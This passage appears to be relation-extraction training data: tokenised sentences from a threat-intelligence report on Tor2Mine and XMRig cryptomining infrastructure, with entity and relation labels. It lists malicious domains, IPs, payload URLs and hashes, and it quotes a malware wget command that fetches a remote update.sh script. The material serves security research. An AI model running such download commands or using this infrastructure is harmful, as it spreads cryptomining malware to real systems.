"RF", "evidence": [7], "t": 16, "h": 17}, {"r": "EX", "evidence": [7], "h": 17, "t": 18}, {"r": "WR", "evidence": [7], "t": 18, "h": 19}]}, {"title": "087-12", "sents": [["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [20, 20], "name": "107.181.160.197", "pos": [20, 21], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [26, 26], "name": "185.10.68.147", "pos": [26, 27], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [33, 33], "name": "185.10.68.147", "pos": [33, 34], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "domain", "pos": [5, 6], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [77, 77], "name": "URLs", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [85, 85], "name": "Tor2Mine", "pos": [17, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": ".hta", "pos": [26, 27], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "checking.ps1", "pos": [30, 31], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [113, 113], "name": "195.123.234.33", "pos": [12, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "payloads", "pos": [18, 19], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "XMRig", "pos": [21, 22], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [132, 132], "name": "185.10.68.147", "pos": [8, 9], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [156, 156], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [162, 162], "name": "XMRigCC", "pos": [10, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "XMRig", "pos": [15, 16], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "actors", "pos": [21, 22], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [188, 188], "name": "185.10.68.147", "pos": [13, 14], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [205, 205], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [209, 209], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "21_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0, 1, 2, 3], "t": 1, "h": 8}, {"r": "RF", "evidence": [0, 1, 2, 3], "t": 1, "h": 8}, {"r": "ST", "evidence": [0, 1, 2, 3], "t": 3, "h": 8}, {"r": "RF", "evidence": [0, 1, 2, 3], "t": 3, "h": 8}, {"r": "ST", "evidence": [1, 2, 3], "t": 4, "h": 8}, {"r": "RF", "evidence": [1, 2, 3], "t": 4, "h": 8}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "ST", "evidence": [3], "t": 7, "h": 8}, {"r": "RF", "evidence": [3], "t": 7, "h": 8}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 10}, {"r": "CO", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 11}, {"r": "WR", "evidence": [4], "t": 12, "h": 13}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 15}, {"r": "ST", "evidence": [6], "t": 15, "h": 16}, {"r": "RF", "evidence": [6], "t": 15, "h": 16}, {"r": "EX", "evidence": [6], "h": 16, "t": 17}, {"r": "WR", "evidence": [6], "t": 17, "h": 18}, {"r": "CO", "evidence": [7], "h": 20, "t": 21}, {"r": "CO", "evidence": [7], "t": 19, "h": 20}]}, {"title": "087-13", "sents": [["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [12, 12], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [30, 30], "name": "domain", "pos": [5, 6], "index": "2_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [34, 34], "name": "URLs", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "Tor2Mine", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": ".hta", "pos": [26, 27], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "checking.ps1", "pos": [30, 31], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [70, 70], "name": "195.123.234.33", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "payloads", "pos": [18, 19], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "XMRig", "pos": [21, 22], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [89, 89], "name": "185.10.68.147", "pos": [8, 9], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [113, 113], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "XMRigCC", "pos": [10, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [124, 124], "name": "XMRig", "pos": [15, 16], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [130, 130], "name": "actors", "pos": [21, 22], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [145, 145], "name": "185.10.68.147", "pos": [13, 14], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [162, 162], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [175, 175], "name": "actors", "pos": [5, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [179, 179], "name": "PowerShell commands", "pos": [9, 11], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [183, 183], "name": ".ps1", "pos": [13, 14], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [186, 186], "name": "Mshta", "pos": [16, 17], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": ".hta", "pos": [19, 20], "index": "22_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2], "t": 0, "h": 4}, {"r": "RF", "evidence": [0, 1, 2], "t": 0, "h": 4}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "RF", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "ST", "evidence": [2], "t": 3, "h": 4}, {"r": "RF", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 6}, {"r": "CO", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 7}, {"r": "WR", "evidence": [3], "t": 8, "h": 9}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "ST", "evidence": [5], "t": 11, "h": 12}, {"r": "RF", "evidence": [5], "t": 11, "h": 12}, {"r": "EX", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5], "t": 13, "h": 14}, {"r": "CO", "evidence": [6], "h": 16, "t": 17}, {"r": "CO", "evidence": [6], "t": 15, "h": 16}, {"r": "ST", "evidence": [6, 7], "t": 15, "h": 18}, {"r": "RF", "evidence": [6, 7], "t": 15, "h": 18}, {"r": "EX", "evidence": [7], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 18, "t": 20}, {"r": "FR", "evidence": [7], "h": 18, "t": 21}, {"r": "EX", "evidence": [7], "h": 21, "t": 22}]}, {"title": "087-14", "sents": [["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [19, 19], "name": "domain", "pos": [5, 6], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [23, 23], "name": "URLs", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "Tor2Mine", "pos": [17, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": ".hta", "pos": [26, 27], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "checking.ps1", "pos": [30, 31], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [59, 59], "name": "195.123.234.33", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "payloads", "pos": [18, 19], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "XMRig", "pos": [21, 22], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [78, 78], "name": "185.10.68.147", "pos": [8, 9], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [102, 102], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "XMRigCC", "pos": [10, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "XMRig", "pos": [15, 16], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "actors", "pos": [21, 22], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [134, 134], "name": "185.10.68.147", "pos": [13, 14], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [151, 151], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [155, 155], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "actors", "pos": [5, 6], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "PowerShell commands", "pos": [9, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": ".ps1", "pos": [13, 14], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [175, 175], "name": "Mshta", "pos": [16, 17], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": ".hta", "pos": [19, 20], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "Shell script file", "pos": [6, 9], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "23_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "RF", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 6}, {"r": "WR", "evidence": [2], "t": 7, "h": 8}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "t": 10, "h": 11}, {"r": "RF", "evidence": [4], "t": 10, "h": 11}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4], "t": 12, "h": 13}, {"r": "CO", "evidence": [5], "h": 15, "t": 16}, {"r": "CO", "evidence": [5], "t": 14, "h": 15}, {"r": "ST", "evidence": [5, 6], "t": 14, "h": 17}, {"r": "RF", "evidence": [5, 6], "t": 14, "h": 17}, {"r": "EX", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6], "h": 17, "t": 19}, {"r": "FR", "evidence": [6], "h": 17, "t": 20}, {"r": "EX", "evidence": [6], "h": 20, "t": 21}, {"r": "CO", "evidence": [7], "h": 22, "t": 23}]}, {"title": "087-15", "sents": [["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "domain", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "URLs", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "Tor2Mine", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": ".hta", "pos": [26, 27], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "checking.ps1", "pos": [30, 31], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "195.123.234.33", "pos": [12, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": "payloads", "pos": [18, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "XMRig", "pos": [21, 22], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [64, 64], "name": "185.10.68.147", "pos": [8, 9], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [88, 88], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "XMRigCC", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "XMRig", "pos": [15, 16], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [105, 105], "name": "actors", "pos": [21, 22], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [120, 120], "name": "185.10.68.147", "pos": [13, 14], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [137, 137], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [141, 141], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [150, 150], "name": "actors", "pos": [5, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [154, 154], "name": "PowerShell commands", "pos": [9, 11], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [158, 158], "name": ".ps1", "pos": [13, 14], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [161, 161], "name": "Mshta", "pos": [16, 17], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [164, 164], "name": ".hta", "pos": [19, 20], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [173, 173], "name": "Shell script file", "pos": [6, 9], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [177, 177], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "file", "pos": [4, 5], "index": "23_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [190, 190], "name": "wget request", "pos": [10, 12], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [193, 193], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 4}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "WR", "evidence": [1], "t": 6, "h": 7}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "t": 9, "h": 10}, {"r": "RF", "evidence": [3], "t": 9, "h": 10}, {"r": "EX", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "t": 11, "h": 12}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [4], "t": 13, "h": 14}, {"r": "ST", "evidence": [4, 5], "t": 13, "h": 16}, {"r": "RF", "evidence": [4, 5], "t": 13, "h": 16}, {"r": "EX", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 16, "t": 18}, {"r": "FR", "evidence": [5], "h": 16, "t": 19}, {"r": "EX", "evidence": [5], "h": 19, "t": 20}, {"r": "IJ", "evidence": [5, 6, 7], "h": 19, "t": 24}, {"r": "CO", "evidence": [6], "h": 21, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "EX", "evidence": [7], "t": 23, "h": 24}, {"r": "ST", "evidence": [7], "h": 24, "t": 25}, {"r": "RF", "evidence": [7], "h": 24, "t": 25}, {"r": "RD", "evidence": [7], "t": 23, "h": 24}]}, {"title": "087-16", "sents": [["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "195.123.234.33", "pos": [12, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "payloads", "pos": [18, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "XMRig", "pos": [21, 22], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [31, 31], "name": "185.10.68.147", "pos": [8, 9], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "XMRigCC", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "XMRig", "pos": [15, 16], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "actors", "pos": [21, 22], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [87, 87], "name": "185.10.68.147", "pos": [13, 14], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [104, 104], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [108, 108], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "actors", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "PowerShell commands", "pos": [9, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": ".ps1", "pos": [13, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "Mshta", "pos": [16, 17], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [131, 131], "name": ".hta", "pos": [19, 20], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "Shell script file", "pos": [6, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [144, 144], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "file", "pos": [4, 5], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [157, 157], "name": "wget request", "pos": [10, 12], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [160, 160], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [172, 172], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [175, 175], "name": "VirusTotal", "pos": [11, 12], "index": "22_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [181, 181], "name": "wget request", "pos": [17, 19], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [194, 194], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": 